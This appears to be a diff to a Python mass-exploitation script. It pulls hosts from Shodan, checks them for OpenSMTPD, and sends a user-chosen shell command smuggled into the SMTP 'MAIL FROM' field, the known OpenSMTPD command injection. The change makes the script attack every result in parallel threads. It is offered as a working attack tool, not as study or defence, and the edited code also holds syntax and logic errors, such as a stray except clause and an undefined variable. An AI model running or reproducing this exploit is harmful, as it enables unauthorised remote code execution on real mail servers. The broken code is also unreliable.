@@ -7,6 +7,7 @@ import time, sys, threading, shodan, requests
 from socket import *
 from colorama import Fore
 from datetime import datetime
+from threading import Thread
 
 print (f'''{Fore.RED}
 {Fore.WHITE}  ___                  {Fore.RED} ____  __  __ _____ ____  ____
@@ -29,7 +30,9 @@ api = shodan.Shodan(key)
 payload = input('Payload : ')
 port = 25
 
-def exploit(ip:str, port:int):
+def exploit(ip:str, port:int, count:int):
+    exploit_status = 0
+    
     s = socket(AF_INET, SOCK_STREAM)
     s.settimeout(1)
 
@@ -38,17 +41,17 @@ def exploit(ip:str, port:int):
         res = s.recv(1024)
 
         if 'OpenSMTPD' not in str(res):
-            return 1
+            exploit_status = 1
 
         s.send(b'HELO x\r\n')
         res = s.recv(1024)
         if '250' not in str(res):
-            return 2
+            exploit_status = 2
 
         s.send(bytes(f'MAIL FROM:<;{payload};>\r\n', 'utf-8'))
         res = s.recv(1024)
         if '250' not in str(res):
-            return 3
+            exploit_status = 3
     
         s.send(b'RCPT TO:<root>\r\n')
         s.recv(1024)
@@ -58,9 +61,26 @@ def exploit(ip:str, port:int):
         s.recv(1024)
         s.send(b'QUIT\r\n')
         a = s.recv(1024)
-        return 4
+        exploit_status = 4
     except:
-        return 5
+        exploit_status = 5
+        
+    if exploit_status == 4:
+        count += 1
+        print(f'{Fore.GREEN}[{current}]{Fore.WHITE} Payload Sent : {ip}{Fore.WHITE}')
+    elif exploit_status == 1:
+        print(f'{Fore.YELLOW}[{current}]{Fore.WHITE} Non-OpenSMTPD Machine : {ip}{Fore.WHITE}')
+    elif exploit_status == 2:
+        print(f'{Fore.RED}[{current}]{Fore.WHITE} Failed To Receive Heartbeat : {ip}{Fore.WHITE}')
+    elif exploit_status == 3:
+        print(f'{Fore.RED}[{current}]{Fore.WHITE} Could Not Exucute Payload : {ip}{Fore.WHITE}')
+    elif exploit_status == 5:
+        print(f'{Fore.BLUE}[{current}]{Fore.WHITE} Could Not Connect To Host : {ip}{Fore.WHITE}')
+    else:
+        print('Exited')
+        exit()
+    except KeyboardInterrupt as e:
+        print(f'Exited')
  
  
 def main():
@@ -75,27 +95,14 @@ def main():
         print(f'{Fore.GREEN}Started OSMTPD{Fore.WHITE}\n')
         print('===========================================================')
         for result in results['matches']:
+            current = now.strftime('%H:%M:%S')
+            ip = result["ip_str"]
+            ip = ip.strip("\r\n")
             try:
-                current = now.strftime('%H:%M:%S')
-                ip = result["ip_str"]
-                ip = ip.strip("\r\n")
-                run = exploit(ip, port)
-                if run == 4:
-                    count += 1
-                    print(f'{Fore.GREEN}[{current}]{Fore.WHITE} Payload Sent : {ip}{Fore.WHITE}')
-                elif run == 1:
-                    print(f'{Fore.YELLOW}[{current}]{Fore.WHITE} Non-OpenSMTPD Machine : {ip}{Fore.WHITE}')
-                elif run == 2:
-                    print(f'{Fore.RED}[{current}]{Fore.WHITE} Failed To Receive Heartbeat : {ip}{Fore.WHITE}')
-                elif run == 3:
-                    print(f'{Fore.RED}[{current}]{Fore.WHITE} Could Not Exucute Payload : {ip}{Fore.WHITE}')
-                elif run == 5:
-                    print(f'{Fore.BLUE}[{current}]{Fore.WHITE} Could Not Connect To Host : {ip}{Fore.WHITE}')
-                else:
-                    print('Exited')
-                    exit()
-            except KeyboardInterrupt as e:
-                print(f'Exited')
+                Thread(target=exploit, args=(ip, port, count,),).start()
+            except:
+                pass
+                
     except KeyboardInterrupt as e:
         print(f'Exited')
 
